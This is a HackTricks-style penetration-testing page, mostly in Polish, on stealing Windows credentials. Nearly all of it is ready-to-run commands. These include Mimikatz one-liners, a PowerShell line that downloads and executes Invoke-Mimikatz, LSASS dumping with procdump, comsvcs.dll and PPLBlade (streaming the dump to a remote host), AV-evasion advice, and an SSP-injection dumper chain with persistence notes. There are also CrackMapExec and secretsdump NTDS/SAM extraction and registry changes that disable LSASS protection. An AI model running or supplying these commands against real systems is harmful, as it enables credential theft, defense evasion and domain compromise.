# Kradzież Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz może zrobić na** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatzowi wydobycie niektórych credentials.**

## Credentials z Meterpreter

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **który** stworzyłem, aby **wyszukać hasła i hashes** w systemie ofiary.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, nie jest wykrywany przez Defendera.\
Możesz użyć tego narzędzia do **dump the lsass process**, **download the dump** i **extract** the **credentials locally** z zrzutu.

Możesz także użyć [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre **AV** mogą uznać użycie **procdump.exe to dump lsass.exe** za **złośliwe**, ponieważ wykrywają ciąg **"procdump.exe" and "lsass.exe"**. Dlatego bardziej ukryte jest przekazanie jako **argument** **PID** procesu lsass.exe do procdump **zamiast** nazwy lsass.exe.

### Zrzucanie lsass za pomocą **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll** znajdująca się w `C:\Windows\System32` jest odpowiedzialna za **zrzucanie pamięci procesu** w przypadku awarii. Ta DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, zaprojektowaną do wywołania przy użyciu `rundll32.exe`.\
Nieistotne jest użycie pierwszych dwóch argumentów, natomiast trzeci argument dzieli się na trzy składowe. ID procesu do zrzutu stanowi pierwszą składową, lokalizacja pliku zrzutu — drugą, a trzecia składowa to ściśle słowo **full**. Nie ma innych opcji.\
Po przeparsowaniu tych trzech składników, DLL tworzy plik zrzutu i zapisuje do niego pamięć wskazanego procesu.\
Wykorzystanie **comsvcs.dll** pozwala na zrzut procesu lsass, eliminując potrzebę przesyłania i uruchamiania procdump. Ta metoda jest opisana szczegółowo na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Możesz zautomatyzować ten proces za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass za pomocą Menedżera zadań**

1. Kliknij prawym przyciskiem myszy na pasek zadań i wybierz Menedżera zadań
2. Kliknij na Więcej szczegółów
3. W zakładce Processes wyszukaj proces "Local Security Authority Process"
4. Kliknij prawym przyciskiem myszy na proces "Local Security Authority Process" i wybierz "Create dump file".

### Zrzucanie lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) jest podpisanym przez Microsoft plikiem binarnym, który jest częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Zrzucanie lsass za pomocą PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie Protected Process Dumper Tool, które obsługuje obfuskację memory dump i przesyłanie ich na zdalne stacje robocze bez zapisywania na dysku.

**Kluczowe funkcje**:

1. Omijanie ochrony PPL
2. Obfuskacja plików memory dump w celu ominięcia mechanizmów wykrywania opartych na sygnaturach Defendera
3. Wgrywanie memory dump przy użyciu metod RAW i SMB bez zapisywania na dysku (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon dostarcza trzyetapowy dumper nazwany **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, więc EDR hooki na tym API nigdy się nie uruchamiają:

1. **Stage 1 loader (`lals.exe`)** – przeszukuje `fdp.dll` w poszukiwaniu placeholdera składającego się z 32 małych znaków `d`, nadpisuje go absolutną ścieżką do `rtu.txt`, zapisuje załatany DLL jako `nfdp.dll` i wywołuje AddSecurityPackageA("nfdp","fdp"). To zmusza **LSASS** do załadowania złośliwego DLL jako nowego Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – gdy LSASS ładuje `nfdp.dll`, DLL czyta `rtu.txt`, XORuje każdy bajt z `0x20` i mapuje odszyfrowany blob do pamięci przed przekazaniem wykonywania.
3. **Stage 3 dumper** – zmapowany payload reimplementuje logikę MiniDump używając bezpośrednich syscalls rozwiązanych z zahashowanych nazw API (seed = 0xCD7815D6; h ^= (ch + ror32(h,8))). Dedykowany export o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, strumieniuje skompresowany zrzut LSASS do pliku i zamyka uchwyt, żeby później można było go eksfiltrować.

Operator notes:

* Trzymaj `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Stage 1 nadpisuje hard-coded placeholder absolutną ścieżką do `rtu.txt`, więc rozdzielenie plików przerwie łańcuch.
* Rejestracja odbywa się przez dopisanie `nfdp` do HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages. Możesz sam ustawić tę wartość, żeby LSASS przeładowywał SSP przy każdym starcie.
* Pliki `%TEMP%\*.ddt` to skompresowane zrzuty. Decompress lokalnie, następnie przekaż je do Mimikatz/Volatility w celu wyodrębnienia poświadczeń.
* Uruchomienie `lals.exe` wymaga uprawnień admin/SeTcb, żeby AddSecurityPackageA się powiódł; po zwróceniu się wywołania LSASS transparentnie ładuje zainstalowany SSP i wykonuje Stage 2.
* Usunięcie DLL z dysku nie usuwa go z pamięci LSASS. Usuń wpis rejestru i zrestartuj LSASS (reboot) albo zostaw DLL dla długotrwałej persystencji.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Zrzucenie NTDS.dit z docelowego DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Zrzut historii haseł NTDS.dit z docelowego DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Pokaż atrybut pwdLastSet dla każdego konta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Te pliki powinny być **zlokalizowane** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM_. Jednak **nie możesz ich po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najłatwiejszy sposób na ukradnięcie tych plików to pobranie ich kopii z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashes** za pomocą:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Możesz wykonać kopiowanie chronionych plików za pomocą tej usługi. Musisz być Administratorem.

#### Korzystanie z vssadmin

Plik binarny vssadmin jest dostępny tylko w wersjach Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ale możesz to samo zrobić z poziomu **Powershell**. Oto przykład **jak skopiować plik SAM** (używany dysk to "C:" i jest zapisany w C:\users\Public), ale możesz użyć tego do skopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Na koniec możesz też użyć [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby skopiować SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Plik **NTDS.dit** jest uważany za serce **Active Directory**, zawierając kluczowe dane o obiektach użytkowników, grupach i ich członkostwach. To tam przechowywane są **password hashes** dla użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się pod ścieżką _%SystemRoom%/NTDS/ntds.dit_.

W tej bazie utrzymywane są trzy główne tabele:

- **Data Table**: Ta tabela przechowuje szczegóły dotyczące obiektów, takich jak użytkownicy i grupy.
- **Link Table**: Śledzi relacje, np. członkostwa w grupach.
- **SD Table**: **Security descriptors** dla każdego obiektu są tutaj przechowywane, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. W związku z tym **część** pliku **NTDS.dit** może znajdować się **w pamięci `lsass`** (można tam znaleźć najprawdopodobniej ostatnio dostępne dane ze względu na poprawę wydajności przez użycie **cache**).

#### Deszyfrowanie hashes w NTDS.dit

Hash jest szyfrowany 3 razy:

1. Odszyfruj Password Encryption Key (**PEK**) przy użyciu **BOOTKEY** i **RC4**.
2. Odszyfruj ten **hash** przy użyciu **PEK** i **RC4**.
3. Odszyfruj ten **hash** przy użyciu **DES**.

**PEK** mają tę samą wartość na każdym kontrolerze domeny, ale jest ono zaszyfrowane wewnątrz pliku **NTDS.dit** przy użyciu **BOOTKEY** pliku **SYSTEM** kontrolera domeny (różni się pomiędzy kontrolerami domeny). Z tego powodu, aby uzyskać poświadczenia z pliku NTDS.dit, potrzebujesz plików NTDS.dit i SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz także użyć [**volume shadow copy**](#stealing-sam-and-system) do skopiowania pliku **ntds.dit**. Pamiętaj, że będziesz także potrzebować kopii pliku **SYSTEM** (ponownie: [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Extracting hashes from NTDS.dit**

Gdy **uzyskasz** pliki **NTDS.dit** i **SYSTEM**, możesz użyć narzędzi takich jak _secretsdump.py_ do **wyodrębnienia hashy**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz także **wyodrębnić je automatycznie** za pomocą prawidłowego konta domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Dla **dużych plików NTDS.dit** zaleca się ich wyodrębnienie przy użyciu [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na koniec możesz też użyć **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyeksportować do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Eksportowane są nie tylko sekrety, ale także całe obiekty i ich atrybuty, co umożliwia dalsze wydobywanie informacji, gdy surowy plik NTDS.dit został już pobrany.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Plik rejestru `SYSTEM` jest opcjonalny, ale umożliwia odszyfrowanie sekretów (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Oprócz innych informacji wydobywane są następujące dane: konta użytkowników i komputerów z ich hashami, UAC flags, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekurencyjne członkostwa, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typem zaufania, kierunkiem i atrybutami...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
```
lazagne.exe all
```
## Inne narzędzia do wyodrębniania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie umożliwia wyodrębnianie poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Służy do wyodrębniania poświadczeń z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnij poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **uruchom** i hasła zostaną wyodrębnione.

## Wykorzystywanie nieaktywnych sesji RDP i osłabianie kontroli bezpieczeństwa

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – parse every user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (successful logon) and **25** (disconnect) to map who administered the box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Once you know which Domain Admin regularly connects, dump LSASS (with LalsDumper/Mimikatz) while their **disconnected** session still exists. CredSSP + NTLM fallback leaves their verifier and tokens in LSASS, which can then be replayed over SMB/WinRM to grab `NTDS.dit` or stage persistence on domain controllers.

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne ponowne użycie poświadczeń/biletów podczas RDP, umożliwiając pivoty w stylu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, dzięki czemu lokalni administratorzy otrzymują tokeny bez ograniczeń w sieci.
* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM zalogować się, gdy DC jest online, dając atakującym kolejne wbudowane konto o wysokich uprawnieniach.
* `RunAsPPL=0` usuwa ochrony LSASS PPL, przez co dostęp do pamięci staje się trywialny dla dumperów takich jak LalsDumper.

## Odniesienia

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
